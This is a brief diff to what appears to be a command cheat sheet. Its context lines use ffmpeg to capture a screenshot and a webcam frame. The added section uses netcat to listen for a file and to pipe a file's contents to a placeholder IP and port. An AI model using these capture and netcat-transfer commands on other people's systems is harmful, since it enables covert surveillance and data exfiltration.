@@ -38,4 +38,10 @@ ffmpeg -f x11grab -framerate 1 -i :0.0 -vframes 1 screenshot.jpg
 ffmpeg -f video4linux2 -s 640x480 -i /dev/video0 -ss 0:0:1 -frames 1 /tmp/selfie.jpg
 ```
 
-
+## Send File
+```
+nc -lvp 6667 > out
+```
+```
+cat <file> | nc <IP> <PORT>
+```
